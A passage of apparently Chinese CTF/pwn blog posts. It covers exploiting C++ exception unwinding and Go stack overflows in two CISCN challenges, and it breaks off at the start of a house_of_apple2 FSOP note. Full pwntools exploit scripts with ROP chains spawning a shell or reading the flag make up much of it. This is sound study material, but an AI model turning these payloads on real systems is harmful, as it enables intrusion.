<p>这里我们的问题又回到了如何劫持程序控制流，参考exp可以发现，是通过覆盖该函数栈帧的返回地址为0x401bc7来劫持的。那么结合前面所分析的函数调用链，其实我们可以这样子从大体上理解：出现调用cleanup是因为当前栈帧不匹配catch块，所以要进行清理，之后用<code>__unwind_resume</code>继续找匹配的catch块时，由于返回地址被改为了一个catch块的handler，所以可以直接匹配执行。要深入理解为什么改返回地址可行，我们可以通过追踪rcx值的变化实现，因为最后从<code>__unwind_resume</code>跳转到目标地址是通过<code>mov rsp,rcx;pop rcx;jmp rcx</code>实现的。提取出与rcx变化有关的指令按顺序如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;_Unwind_Resume+316&gt; call 0x7fa75620d6a0</span><br><span class="line">...</span><br><span class="line">&lt;_Unwind_Resume+337&gt; call 0x7fb2f2d9dc20</span><br><span class="line">...</span><br><span class="line">&lt;_Unwind_Resume+402&gt; mov rcx, rax	#实际获取了上一个函数的返回值</span><br><span class="line">...</span><br><span class="line">&lt;_Unwind_Resume+414&gt; lea rcx, [rbp + rcx + 8]</span><br><span class="line">...</span><br><span class="line">&lt;_Unwind_Resume+447&gt; mov rsp,rcx</span><br><span class="line">&lt;_Unwind_Resume+450&gt; pop rcx</span><br><span class="line">&lt;_Unwind_Resume+451&gt; jmp rcx</span><br></pre></td></tr></table></figure></div>

<p>我们可以再跟进<code>0x7fb2f2d9dc20</code>看一下，发现只是对rdx做了一些改变，要再往前找。而前面的<code>0x7fa75620d6a0</code>执行后恰好使rax变为0x90，和后面赋给rcx值时的rax值相同，说明该函数是关键，进去看看。</p>
<p>其中的逻辑相当复杂，但在有个17次的循环后，有看到原来栈帧的返回地址，而执行过程中rbp始终为0x7ffcc254a5b0，_Unwind_Resume函数开始调用时也并没有改变rbp的值，这里rax实际能计算出一个当前rbp到处理栈帧返回地址附近的一个偏移，然后最后就能使rcx成为返回地址处的内容并跳转过去当作目标catch的handler函数进行执行。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170800205.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170811667.png"
                      class=""
                >

<p>其实这和正常的栈溢出有点像，那我们不禁想如果覆盖成别的其他不属于handler的地址会如何呢？比如我们把返回地址覆盖为main试试，结果是会报出<strong>terminate called after throwing an instance of ‘char*’</strong>，因为异常没有正常匹配。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170824548.png"
                      class=""
                >

<p>然后我们可以试试换一个catch(int)的handler进行匹配，发现会有如下错误，rdx是由前面<code>mov  rdx, qword ptr [rdx] </code>得到的，前面的rdx值为0x404208，也就是我们可控的地址，我们可以输入一个合法的地址进去看看。最后还是会报<strong>terminate called after throwing an instance of ‘char*’</strong>。后面看了别人博客才发现这个匹配的流程需要一定的经验。其他函数的catch块对应不上。</p>
<blockquote>
<p>将ret地址修改为backdoor函数的try块地址范围内<code>0x401252-0x401258</code>(在我的测试中发现，这个范围是个左开但是右侧不精确的范围，为了保证成功率可以使用左测边界+1的地址)。</p>
</blockquote>
<p>我们这里的try块的范围是从0x0000000000401BC2到0x0000000000401BC7的，最终能打通的范围也的确是0x0000000000401BC3到0x0000000000401BC7。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170839585.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170848861.png"
                      class=""
                >

<p>之后还需要注意的一点是，最后进入目标handler后，存在一个<code>mov qword ptr [rbp - 0x18], rax</code>的赋值，我们需要确保覆盖的rbp的值减去0x18后为一个可写的地址，否则会出错。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170859003.png"
                      class=""
                >

<p>最终exp如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trace</span>(<span class="params">data,choice=<span class="string">&quot;n&quot;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your chocie:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;You can record log details here:&quot;</span>,data)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Do you need to check the records?&quot;</span>,choice)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">warn</span>(<span class="params">data</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your chocie:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Type your message here plz:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your chocie:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">magic = <span class="number">0x0000000000401BC7</span></span><br><span class="line">fake_rbp = <span class="number">0x404200</span>     <span class="comment">#只要其-0x18处可写就行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    trace(<span class="string">b&quot;/bin/sh\x00&quot;</span>*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x70</span> + p64(fake_rbp) + p64(magic)</span><br><span class="line">warn(payload)</span><br><span class="line">p.interactive()</span><br><span class="line">                             </span><br></pre></td></tr></table></figure></div>



<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul>
<li>主要调用链为<code>__cxa_throw</code>-&gt;<code>_Unwind_RaiseException</code>-&gt;<code>clearup</code>-&gt;<code>_Unwind_Resume</code>-&gt;<code>对应catch块的handler函数</code></li>
<li>除了CHOP，有两处漏洞可以利用<ul>
<li>覆盖rbp进行栈迁移（有leave;ret可供使用）</li>
<li>覆盖返回地址到其他handler函数</li>
</ul>
</li>
</ul>
<h4 id="参考内容"><a href="#参考内容" class="headerlink" title="参考内容"></a>参考内容</h4><ul>
<li><a class="link"   href="https://blog.csdn.net/jennycisp/article/details/134965719" >https://blog.csdn.net/jennycisp/article/details/134965719<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   href="https://www.bilibili.com/video/BV1eE421L7ZE/" >https://www.bilibili.com/video/BV1eE421L7ZE/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   href="https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/index.html" >https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/index.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>exception</tag>
      </tags>
  </entry>
  <entry>
    <title>gopwn初探</title>
    <url>/blog/2024/09/22/go-pwn/</url>
    <content><![CDATA[<h4 id="go-pwn的特点"><a href="#go-pwn的特点" class="headerlink" title="go pwn的特点"></a>go pwn的特点</h4><ul>
<li><strong>Golang</strong> 使用了自己的运行时和内存管理机制。Go 的堆栈是可扩展的（split-stack model），即每个 Goroutine 的堆栈大小可以动态扩展。这使得堆栈布局更加复杂，和固定大小的堆栈相比更难预测。</li>
<li>无标准栈帧，也就是不怎么依靠rbp作为栈帧指针（但实际那个位置有时还是维护rbp），通常通过rsp进行局部变量寻址。</li>
<li>Go 语言依赖垃圾回收器管理内存，而 C&#x2F;C++ 依赖程序员手动管理内存。这意味着在 Go 程序中，利用内存分配漏洞（如 UAF 或 double free）时，必须考虑到垃圾回收器的行为。</li>
<li>Go 语言的异常处理机制是通过 <code>panic</code> 和 <code>recover</code> 完成的，而不像 C&#x2F;C++ 使用 <code>setjmp/longjmp</code> 或 C++ 的异常捕获机制。这导致堆栈结构和控制流的变化更为复杂，特别是在发生 <code>panic</code> 后。在漏洞利用过程中，如果程序进入了 <code>panic</code> 状态，控制流会被重定向，这可能干扰漏洞利用过程。</li>
<li>Go 的堆内存管理机制不同于标准的 <code>malloc</code>&#x2F;<code>free</code>。Go 运行时会使用自己的内存分配器，而不是像传统 C&#x2F;C++ 程序中依赖系统的 <code>malloc</code> 和 <code>free</code>。这意味着许多针对 C&#x2F;C++ 堆的利用技术，如 <code>fastbin attack</code>、<code>tcache</code> 等，不适用于 Go 程序。</li>
</ul>
<h4 id="栈扩展机制"><a href="#栈扩展机制" class="headerlink" title="栈扩展机制"></a>栈扩展机制</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:</span><br><span class="line">lea     r12, [rsp+var_218]			</span><br><span class="line">cmp     r12, [r14+10h]				//上面两句也有可能是cmp rsp, [r14+10h]这种形式</span><br><span class="line">jbe     loc_4C18C0</span><br><span class="line">......</span><br><span class="line">loc_4C18C0:</span><br><span class="line">mov     [rsp+arg_0], rax</span><br><span class="line">mov     [rsp+arg_8], rbx</span><br><span class="line">mov     [rsp+arg_10], rcx</span><br><span class="line">call    runtime_morestack_noctxt</span><br><span class="line">mov     rax, [rsp+arg_0]</span><br><span class="line">mov     rbx, [rsp+arg_8]</span><br><span class="line">mov     rcx, [rsp+arg_10]</span><br><span class="line">jmp     a</span><br></pre></td></tr></table></figure></div>

<p>r14+0x10地址处存的就是当前栈段的上限信息，不够时会调用runtime_morestack_noctxt进行扩展。call一个函数时与c同样会把返回地址存到栈上，在栈扩展中也会维护好这个返回地址的位置。而每次栈扩展出的新栈与原来的栈是不连续的，但一个栈段只要大小没有耗尽，也可以存多个函数的栈帧。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202642330.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202650340.png"
                      class=""
                >

<p>可以看到这里的栈实际不在x86_64常使用的栈段中。而且确实会把返回地址压入栈。</p>
<h4 id="传参顺序"><a href="#传参顺序" class="headerlink" title="传参顺序"></a>传参顺序</h4><p>传参用到的寄存器依次是：AX，BX，CX，DI，SI，R8，R9，R10，R11</p>
<h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><h5 id="CISCN-2023-初赛-shallwego"><a href="#CISCN-2023-初赛-shallwego" class="headerlink" title="[CISCN 2023 初赛]shallwego"></a>[CISCN 2023 初赛]shallwego</h5><p>先运行一下看看：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202702201.png"
                      class=""
                >

<p>发现提供了一个shell窗口，但好像要先对cert进行一些操作。看IDA反汇编结果，其中在<strong>main_unk_func0b05</strong>有很多可疑的字符串，经整理大概有如下那么多：</p>
<div class="highlight-container" data-rel="Txt"><figure class="iseeu highlight txt"><table><tr><td class="code"><pre><span class="line">nAcDsMicN</span><br><span class="line"></span><br><span class="line">echo</span><br><span class="line">exit</span><br><span class="line">cert</span><br><span class="line">cd</span><br><span class="line">cat flag</span><br><span class="line">ls -al</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure></div>

<p>其中很多都是命令，有一个字符串是在cert命令后检测的。我们通过动态调试能够发现，r8实际存的是命令（不包括操作符）的长度，rbx存的是输入的整个命令被空格分隔的段数。那我们就可以先执行个 <code>cert nAcDsMicN abcdefg</code> 动调看看。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202742958.png"
                      class=""
                >

<p>之后会进入 <strong>main_unk_func0b01</strong> 中，这里实际对我们输入的第三段（其实这里我们已经可以看作大概是<code>cert 用户名 密码</code>这样一个认证过程）进行加密，与一个写死的字符串进行比较，而且rc4加密的密钥也直接写在程序中了。那么我们就可以先将密文base64解码后，把得到的内容当作密码输入进去，然后看rc4加密后的结果，这个结果就是正确的密码了，因为rc4是对称加密算法。最终得到的密码值为<strong>S33UAga1n@#!</strong></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202759540.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202808837.png"
                      class=""
                >

<p>然后shell提示符就会变成 <code>nightingale#</code> ，之后也可以正常调用其他的设置好的命令，但给的那几个命令都不能直接获取真实flag的值，需要再次寻找漏洞点。经过分析发现别的命令都没什么问题，唯独echo这个命令有两段函数专门处理。并且能打印出我们输入的内容，可以尝试进行栈溢出。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202821181.png"
                      class=""
                >

<p>看到这兴奋起来了，因为这里往栈上写了0x75，也就是u，看来是要开始将输入内容存到栈上了。我们的返回地址在<strong>0xc00011adc8</strong>，而输入从<strong>0xc00011ab98</strong>开始存，其中间隔了0x230个字节。然后这个循环中实际有<code>cmp dl, &#39;+&#39;</code>这个条件判断，如果满足会直接调回去自增rax，也就是循环中的下标自增，直接跳过了后面往栈上写的部分。</p>
<p>那我们先试试echo 0x230字节的垃圾字符看看。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202832431.png"
                      class=""
                >

<p>发现这里最后rdx大于0x200，就直接略过了将值赋值到栈上的操作。说明单次输入不能超过0x200字节，那如果我们在输入中间加入空格呢？</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202844042.png"
                      class=""
                >

<p>这次成功跳过了大小的检测，再往下执行看看效果。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202852228.png"
                      class=""
                >

<p>然后发现直接崩掉了，因为rax是一个下标，所以推断是rbx被更改了以至于赋值失败，那么rbx是在哪里被赋值的呢。实际前面有一句<code>mov rbx, [rsp+298h+var_20]</code>,也就是这个rbx基址是存在<strong>ret_addr-0x20</strong>处的。那我们不能更改这个位置的值，但我们又无法获知这个位置的值，该怎么办呢？很巧的是，程序刚好碰到+会跳过赋值，所以我们可以用8个+来保存rbx。其实也不必那么麻烦，直接全用+填充，最后再覆盖也行。然后就能成功覆盖返回地址，但这里这个填充字符数有点迷，最后我本地动调后填充了0x229个字节后才覆盖到返回地址。</p>
<p>之后是正常的ROP，因为有syscall，就先把&#x2F;bin&#x2F;sh读取到一个地方，然后再用execve调用打即可。最后复现时本地能够用execve通，但远程却有问题，只能拿orw打，不知道是为什么。</p>
<h6 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h6><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 你的 Base64 编码字符串</span></span><br><span class="line">encoded_str = <span class="string">&quot;JLIX8pbSvYZu/WaG&quot;</span></span><br><span class="line"><span class="comment"># 进行 Base64 解码</span></span><br><span class="line">decoded_bytes = base64.b64decode(encoded_str)</span><br><span class="line"><span class="comment"># 打印解码后的字节字符串</span></span><br><span class="line"><span class="built_in">print</span>(decoded_bytes)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./service&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node4.anna.nssctf.cn&quot;,28629)</span></span><br><span class="line">passwd = <span class="string">b&quot;S33UAga1n@#!&quot;</span></span><br><span class="line">payload = <span class="string">b&quot;cert nAcDsMicN &quot;</span> + passwd</span><br><span class="line">p.sendlineafter(<span class="string">&quot;shell$&quot;</span>,payload)</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000444fec</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000041e818</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x000000000049e11d</span></span><br><span class="line">pop_rax_ret = <span class="number">0x000000000040d9e6</span></span><br><span class="line">syscall = <span class="number">0x000000000040328c</span></span><br><span class="line">ret = <span class="number">0x000000000040103d</span></span><br><span class="line">main = <span class="number">0x00000000004C1D60</span></span><br><span class="line">data = <span class="number">0x5A34A0</span></span><br><span class="line">payload = (<span class="string">b&quot;echo &quot;</span>.ljust(<span class="number">0x1f0</span>,<span class="string">b&quot;A&quot;</span>) + <span class="string">b&quot; &quot;</span>).ljust(<span class="number">0x229</span>,<span class="string">b&quot;+&quot;</span>) + p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_ret) + p64(data) + p64(pop_rdx_ret) + p64(<span class="number">0x8</span>) + p64(syscall)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">2</span>) + p64(pop_rdi_ret) + p64(data) + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(syscall) </span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(data) + p64(pop_rdx_ret) + p64(<span class="number">0x40</span>) + p64(syscall)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">1</span>) + p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(data) + p64(pop_rdx_ret) + p64(<span class="number">0x40</span>) + p64(syscall)</span><br><span class="line"><span class="comment">#+ p64(pop_rax_ret) + p64(0x3b) + p64(pop_rdi_ret) + p64(data) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_ret) + p64(0) + p64(syscall) + p64(main)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;nightingale#&quot;</span>,payload)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">&quot;/flag\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h5 id="CISCN-2024-初赛-gostack"><a href="#CISCN-2024-初赛-gostack" class="headerlink" title="[CISCN 2024 初赛]gostack"></a>[CISCN 2024 初赛]gostack</h5><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202922399.png"
                      class=""
                >

<p>先运行一遍找提示字符串，看到调用位置在main_func3，直接gdb打断点进去调试一下。发现输入存在如下位置，但是存在栈上的是指针，没什么用。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202932191.png"
                      class=""
                >

<p>之后还会把数据写到栈的另一个地方，这里直接把内容复制到栈上了，并且没有检测加跳转，可能会有溢出。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202943137.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202953894.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922203005886.png"
                      class=""
                >

<p>然后我们再看看程序的其他部分，其中有个<strong>main_executeCommand</strong>函数引入注目，其中有如下两个子函数：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">call    os_exec_Command</span><br><span class="line">...</span><br><span class="line">call    os_exec__ptr_Cmd_Run</span><br></pre></td></tr></table></figure></div>

<p>其中前者用于创建一个 <code>Cmd</code> 对象，后者用于执行真正的命令。</p>
<p>那么我们试试直接填充0x1d0字节，然后把返回地址覆盖为<strong>main_executeCommand</strong>地址。结果会在最后<code>fmt_Fprintf-&gt;fmt__ptr_pp_doPrintf-&gt;fmt__ptr_pp_printArg-&gt;fmt__ptr_pp_fmtString-&gt;fmt__ptr_fmt_fmtS-&gt;fmt__ptr_fmt_padString-&gt;runtime_growslice</code>这个调用链然后gopanic退出，其提示信息为<code>&quot;growslice: cap out of rangeinternal loc&quot;...</code>，也就是说Go 语言在处理切片（slice）扩容时，发生容量超出合理范围时的一个运行时错误。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x449852    mov    rdi, rsi                        RDI =&gt; 0x4141414141414155 (&#x27;UAAAAAAA&#x27;)</span><br><span class="line">......</span><br><span class="line">0x449939    movabs r8, 0x1000000000000         R8 =&gt; 0x1000000000000</span><br><span class="line">0x449943    cmp    rsi, r8                     0x4141414141414155 - 0x1000000000000     EFLAGS =&gt; 0x206 [ cf PF af zf sf IF df of ]</span><br><span class="line">0x449946    seta   r9b</span><br><span class="line">0x44994a    mov    rsi, rcx                    RSI =&gt; 0x14</span><br><span class="line">0x44994d    mov    r10, rdx                    R10 =&gt; 0x4141414141416000</span><br><span class="line">0x449950    jmp    0x449c69                    &lt;0x449c69&gt;</span><br><span class="line">↓</span><br><span class="line">0x449c69    test   r9b, r9b     1 &amp; 1     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ]</span><br><span class="line">0x449c6c  ✔ jne    0x449d4d                    &lt;0x449d4d&gt;</span><br></pre></td></tr></table></figure></div>

<p>我们稍微往前看就可以发现这里rsi和r8的比较实际上应该就是判断切片大小，而存大小的位置被我们覆盖成为了一堆A。也就是说我们破坏了<code>fmt_Fprintf</code>的一些参数。那我们就打断点在这个函数处看看哪些参数被覆盖成了一堆A。rdx很可疑。但前面调用<code>runtime_convTstring</code>后就没有动过rdx了，这个<code>runtime_convTstring</code>函数也比较短，可以跟进去看看。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922203024108.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922203039143.png"
                      class=""
                >

<p>其中唯一修改了rdx的是这一句，这个函数的栈帧在一开始 <code>sub rsp, 20h</code> 扩充的空间，这里是把rsp+0x30处的内容复制过来，而rsp+0x30处内容前面有 <code>mov qword ptr [rsp + 0x30], rbx </code> 的修改，而我们进这个函数前rbx就已经是0x4141414141414141了，还要往前追溯。发现前面刚好有个 <code>mov rbx, [rsp+208h+var_C8]</code> ，也就是说我们不能把这个位置的数值覆盖掉。经过进一步用正常数值调试发现，这个位置存的其实就是我们输入的大小。那么我们可以试试先填充0x108个垃圾字符，然后输入大小，之后再正常填充。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922203058314.png"
                      class=""
                >

<p>前面的判断绕过了，但在fmt函数中还是崩，但这次是rcx的问题。往前找找，发现是这个<code>runtime_memmove</code>函数的第二个参数源地址被覆盖掉了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922203113527.png"
                      class=""
                >

<p>我们直接把前面要填充的垃圾字符都换成一个可写的地址试试，成功绕过了这个死亡之call，也算是成功地绕过了所有阻碍，终于能劫持控制流返回了（这写了个0x4a0120覆盖返回地址进行测试）。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922203128877.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922203145314.png"
                      class=""
                >

<p>后面就可以直接ret2syscall了，这里我本来还想靠<strong>os_exec_Command</strong>玩一下，但还是要先靠read把&#x2F;bin&#x2F;sh读到一个地方，不如直接调用execve。需要注意的是这个syscall会后面带着改栈上的内容，如下图这样rop链就会被打断，需要绕一下。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922203202348.png"
                      class=""
                >

<h6 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h6><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./gostack&quot;</span>)</span><br><span class="line">bss_add = <span class="number">0x00000000005633C0</span></span><br><span class="line">syscall = <span class="number">0x0000000000404043</span></span><br><span class="line">pop_rdi_5reg_ret = <span class="number">0x00000000004a18a5</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000042138a</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x00000000004944ec</span></span><br><span class="line">pop_rax_ret = <span class="number">0x000000000040f984</span></span><br><span class="line">rop = p64(pop_rdi_5reg_ret) + p64(<span class="number">0</span>)*<span class="number">6</span> + p64(pop_rsi_ret) + p64(bss_add) + p64(pop_rdx_ret) + p64(<span class="number">0x8</span>) + p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">rop += (p64(pop_rdi_5reg_ret) + p64(bss_add)*<span class="number">6</span>)*<span class="number">3</span> + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(pop_rax_ret) + p64(<span class="number">0x3b</span>) + p64(syscall)</span><br><span class="line"></span><br><span class="line">payload = (p64(bss_add)*<span class="number">33</span> + p64(<span class="number">0x1d8</span>))+(p64(bss_add)*<span class="number">24</span>) + rop</span><br><span class="line">log.success(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input your magic message :&quot;</span>,payload)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>go</tag>
        <tag>ciscn wp</tag>
      </tags>
  </entry>
  <entry>
    <title>house_of_apple2利用手法浅析</title>
    <url>/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/</url>
    <content><![CDATA[<h4 id="适用版本"><a href="#适用版本" class="headerlink" title="适用版本"></a>适用版本</h4><ul>
<li>2.23——至今</li>
</ul>
<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
<li>能控制_IO_FILE的vtable和_wide_data(一般使用largebin attack)</li>
<li>程序从main函数返回，或者执行exit函数</li>
<li>能泄露libc_base和heap_base</li>
</ul>
<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><ol>
<li>劫持<code>IO_FILE</code>的<code>vtable</code>为<code>_IO_wfile_jumps</code></li>
<li>控制<code>_wide_data</code>为可控的堆地址空间</li>
<li>控制<code>_wide_data-&gt;_wide_vtable</code>为可控的堆地址空间</li>
<li>控制程序执行<code>IO</code>流函数调用，最终调用到<code>_IO_Wxxxxx</code>函数即可控制程序的执行流</li>
</ol>
<p>总体来说还是利用FSOP，最后<code>_IO_flush_all_lockp</code>中触发调用<code>_IO_OVERFLOW (fp, EOF)</code>这个虚表函数，因为到了高版本glibc，所以不能直接改虚表，需要借助到其他相似结构的其他虚表。</p>
<p>大致有三条链：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">_IO_wfile_overflow -&gt; _IO_wdoallocbuf -&gt; _IO_WDOALLOCATE -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</span><br><span class="line"></span><br><span class="line">_IO_wfile_underflow_mmap -&gt; _IO_wdoallocbuf -&gt; _IO_WDOALLOCATE -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</span><br><span class="line"></span><br><span class="line">_IO_wdefault_xsgetn -&gt; __wunderflow -&gt; _IO_switch_to_wget_mode -&gt; _IO_WOVERFLOW -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)(fp)</span><br></pre></td></tr></table></figure></div>



<h4 id="利用细节"><a href="#利用细节" class="headerlink" title="利用细节"></a>利用细节</h4><p>这里以源鲁杯的futureheap这道题对这种利用方式进行学习。</p>
<h5 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h5><p>先熟悉一下几个结构体的具体字段。</p>
<h6 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="_IO_FILE"></a>_IO_FILE</h6><img  
                     lazyload
                     src="/images/loading.svg"
